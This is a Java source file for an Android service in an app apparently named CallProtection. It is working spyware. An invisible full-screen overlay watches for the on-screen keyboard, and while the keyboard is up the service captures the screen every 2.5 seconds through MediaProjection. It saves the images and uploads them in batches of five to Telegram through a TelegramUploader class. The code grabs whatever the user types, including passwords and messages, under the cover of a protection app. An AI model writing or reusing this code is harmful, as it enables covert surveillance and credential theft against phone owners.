package com.daria.callprotection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * ScreenshotService
 * - Делает скриншоты только при видимой клавиатуре (через overlay view global layout listener)
 * - Использует MediaProjection + ImageReader для реального захвата экрана
 * - Сохраняет файлы в /files/screenshots и отправляет пачками через TelegramUploader
 *
 * Требования:
 * - Overlay permission (Settings.canDrawOverlays) для корректного отслеживания клавиатуры,
 *   либо обеспечить другой способ определения активности клавиатуры.
 * - MainActivity должен запросить MediaProjection (MediaProjectionManager.createScreenCaptureIntent())
 *   и передать resultCode/resultData в Intent при старте сервиса:
 *     Intent i = new Intent(this, ScreenshotService.class);
 *     i.putExtra("resultCode", resultCode);
 *     i.putExtra("resultData", resultData);
 *     ContextCompat.startForegroundService(this, i);
 */
public class ScreenshotService extends Service {
    private static final String TAG = "ScreenshotService";
    private static final String CHANNEL_ID = "screenshot_service_channel";
    private static final int NOTIF_ID = 102;

    private static final int BATCH_SIZE = 5;              // сколько скринов в пачке для отправки
    private static final long SCREENSHOT_INTERVAL_MS = 2500; // интервал между скринами при активной клавиатуре

    // MediaProjection / capture
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private android.hardware.display.VirtualDisplay virtualDisplay;

    // sizes
    private int width;
    private int height;
    private int density;

    // threads & handlers
    private HandlerThread imageThread;
    private Handler imageHandler;
    private ExecutorService ioExecutor;

    // overlay view for keyboard detection
    private WindowManager windowManager;
    private View overlayView;
    private boolean overlayAdded = false;

    // keyboard detection
    private boolean isKeyboardVisible = false;
    private final Handler keyboardHandler = new Handler();
    private final Runnable periodicCaptureRunnable = new Runnable() {
        @Override
        public void run() {
            if (isKeyboardVisible) {
                captureOnce();
                keyboardHandler.postDelayed(this, SCREENSHOT_INTERVAL_MS);
            }
        }
    };

    // batch
    private final List<File> screenshotBatch = new ArrayList<>();

    @Override
    public void onCreate() {
        super.onCreate();
        FileLogger.log("ScreenshotService: onCreate");

        // foreground notification
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification("Сервис скриншотов запущен"));

        // init
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        imageThread = new HandlerThread("ScreenshotImageThread");
        imageThread.start();
        imageHandler = new Handler(imageThread.getLooper());

        ioExecutor = Executors.newSingleThreadExecutor();

        // get display metrics
        DisplayMetrics metrics = new DisplayMetrics();
        if (windowManager != null && windowManager.getDefaultDisplay() != null) {
            windowManager.getDefaultDisplay().getMetrics(metrics);
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;
        } else {
            // fallback
            width = 1080;
            height = 1920;
            density = 320;
        }

        // try add overlay view to track keyboard — if permission present
        tryAddOverlayView();
    }

    /**
     * Try to add an invisible overlay view that will receive global layout changes.
     * Requires SYSTEM_ALERT_WINDOW (canDrawOverlays) permission; if not available, we log and proceed,
     * but keyboard-based capture won't work until the permission is granted.
     */
    private void tryAddOverlayView() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    FileLogger.log("ScreenshotService: no overlay permission; keyboard tracking disabled. Please grant overlay permission.");
                    return;
                }
            }
            overlayView = new View(this);
            // full-screen transparent layout params
            WindowManager.LayoutParams params;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
                        PixelFormat.TRANSLUCENT);
            } else {
                params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
                        PixelFormat.TRANSLUCENT);
            }
            params.gravity = Gravity.TOP | Gravity.LEFT;

            // Prevent the view from drawing anything
            overlayView.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

            overlayView.getViewTreeObserver().addOnGlobalLayoutListener(() -> {
                try {
                    Rect r = new Rect();
                    overlayView.getWindowVisibleDisplayFrame(r);
                    int screenHeight = overlayView.getRootView().getHeight();
                    int keypadHeight = screenHeight - r.bottom;
                    boolean visible = keypadHeight > screenHeight * 0.15;
                    if (visible != isKeyboardVisible) {
                        isKeyboardVisible = visible;
                        FileLogger.log("ScreenshotService: keyboard visibility changed -> " + isKeyboardVisible);
                        if (isKeyboardVisible) {
                            // start periodic capturing
                            keyboardHandler.post(periodicCaptureRunnable);
                        } else {
                            keyboardHandler.removeCallbacks(periodicCaptureRunnable);
                        }
                    }
                } catch (Exception e) {
                    FileLogger.log("ScreenshotService: overlay global layout exception: " + e.getMessage());
                }
            });

            windowManager.addView(overlayView, params);
            overlayAdded = true;
            FileLogger.log("ScreenshotService: overlay view added for keyboard detection");
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: failed to add overlay view: " + e.getMessage());
            overlayAdded = false;
        }
    }

    /**
     * Start service with MediaProjection data passed via Intent extras:
     * - "resultCode" (int)
     * - "resultData" (Parcelable Intent)
     *
     * MainActivity must obtain media projection permission and pass it here.
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (intent != null) {
                int resultCode = intent.getIntExtra("resultCode", -1);
                Intent resultData = intent.getParcelableExtra("resultData");
                if (resultCode != -1 && resultData != null && mediaProjection == null) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
                    setupImageReaderAndVirtualDisplay();
                    FileLogger.log("ScreenshotService: MediaProjection initialized");
                }
            }
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: onStartCommand error: " + e.getMessage());
        }
        return START_STICKY;
    }

    private void setupImageReaderAndVirtualDisplay() {
        try {
            // Create ImageReader with appropriate pixel format (PixelFormat.RGBA_8888)
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenshotService-Capture",
                    width,
                    height,
                    density,
                    0,
                    imageReader.getSurface(),
                    null,
                    imageHandler
            );

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        // handle image in background executor (IO)
                        handleImage(image);
                    }
                } catch (Exception e) {
                    FileLogger.log("ScreenshotService: onImageAvailable error: " + e.getMessage());
                } finally {
                    if (image != null) {
                        image.close();
                    }
                }
            }, imageHandler);

            FileLogger.log("ScreenshotService: ImageReader and VirtualDisplay ready");
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: setup error: " + e.getMessage());
        }
    }

    /**
     * Capture a single frame explicitly (useful when keyboard appears).
     * This will read latest available image if any.
     */
    private void captureOnce() {
        if (imageReader == null) {
            FileLogger.log("ScreenshotService: captureOnce called but imageReader == null");
            return;
        }
        // Trigger reading — latest image will be processed by listener set earlier
        // (we don't need to actively call anything here because the listener reacts to new frames)
        // But to ensure a frame, we can also try acquireLatestImage() once and handle it:
        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image != null) {
                handleImage(image);
            }
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: captureOnce error: " + e.getMessage());
        } finally {
            if (image != null) image.close();
        }
    }

    private void handleImage(Image image) {
        // offload bytes -> bitmap -> file saving into IO executor to avoid blocking the image handler
        ioExecutor.submit(() -> {
            Bitmap bmp = null;
            try {
                Image.Plane[] planes = image.getPlanes();
                if (planes == null || planes.length == 0) {
                    FileLogger.log("ScreenshotService: image planes empty");
                    return;
                }
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;

                // create bitmap with the proper width (including padding) and then crop
                Bitmap fullBmp = Bitmap.createBitmap((width + rowPadding / pixelStride), height, Bitmap.Config.ARGB_8888);
                fullBmp.copyPixelsFromBuffer(buffer);

                // crop to original width if needed
                if (fullBmp.getWidth() != width) {
                    bmp = Bitmap.createBitmap(fullBmp, 0, 0, width, height);
                    fullBmp.recycle();
                } else {
                    bmp = fullBmp;
                }

                File saved = saveBitmapToFile(bmp);
                if (saved != null) {
                    synchronized (screenshotBatch) {
                        screenshotBatch.add(saved);
                    }
                    FileLogger.log("ScreenshotService: saved screenshot " + saved.getName());
                    // When batch reached threshold -> send
                    if (getBatchSize() >= BATCH_SIZE) {
                        List<File> toSend;
                        synchronized (screenshotBatch) {
                            toSend = new ArrayList<>(screenshotBatch);
                            screenshotBatch.clear();
                        }
                        sendBatchAsync(toSend);
                    }
                }
            } catch (Exception e) {
                FileLogger.log("ScreenshotService: handleImage error: " + e.getMessage());
            } finally {
                if (bmp != null) bmp.recycle();
            }
        });
    }

    private int getBatchSize() {
        synchronized (screenshotBatch) {
            return screenshotBatch.size();
        }
    }

    private File saveBitmapToFile(Bitmap bitmap) {
        File dir = null;
        try {
            dir = new File(getFilesDir(), "screenshots");
            if (!dir.exists() && !dir.mkdirs()) {
                FileLogger.log("ScreenshotService: cannot create screenshots dir");
                return null;
            }
            String filename = "screenshot_" + System.currentTimeMillis() + ".png";
            File out = new File(dir, filename);
            try (FileOutputStream fos = new FileOutputStream(out)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
                fos.flush();
            }
            return out;
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: saveBitmapToFile error: " + e.getMessage());
            return null;
        }
    }

    private void sendBatchAsync(List<File> files) {
        if (files == null || files.isEmpty()) return;
        ioExecutor.submit(() -> {
            FileLogger.log("ScreenshotService: sending batch size=" + files.size());
            for (File f : files) {
                if (f == null || !f.exists() || !f.canRead()) {
                    FileLogger.log("ScreenshotService: skipping unreadable file " + (f == null ? "null" : f.getAbsolutePath()));
                    continue;
                }
                // TelegramUploader.uploadFile is assumed async in our project; we call it and let it manage deletion on success.
                try {
                    TelegramUploader.uploadFile(getApplicationContext(), f, "Скриншот: " + f.getName());
                    // Note: TelegramUploader is expected to delete file on success; if not, handle it there.
                } catch (Exception e) {
                    FileLogger.log("ScreenshotService: upload failed for " + f.getName() + " err=" + e.getMessage());
                }
            }
        });
    }

    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("CallProtection")
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_notification) // ensure this resource exists
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Screenshot Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public void onDestroy() {
        FileLogger.log("ScreenshotService: onDestroy");
        try {
            keyboardHandler.removeCallbacks(periodicCaptureRunnable);
            if (overlayAdded && overlayView != null && windowManager != null) {
                try {
                    windowManager.removeView(overlayView);
                } catch (Exception ignored) {}
                overlayAdded = false;
            }
            if (imageReader != null) {
                try { imageReader.close(); } catch (Exception ignored) {}
                imageReader = null;
            }
            if (virtualDisplay != null) {
                try { virtualDisplay.release(); } catch (Exception ignored) {}
                virtualDisplay = null;
            }
            if (mediaProjection != null) {
                try { mediaProjection.stop(); } catch (Exception ignored) {}
                mediaProjection = null;
            }
            if (imageThread != null) {
                try { imageThread.quitSafely(); } catch (Exception ignored) {}
                imageThread = null;
            }
            if (ioExecutor != null) {
                ioExecutor.shutdown();
            }
        } catch (Exception e) {
            FileLogger.log("ScreenshotService: onDestroy cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
            
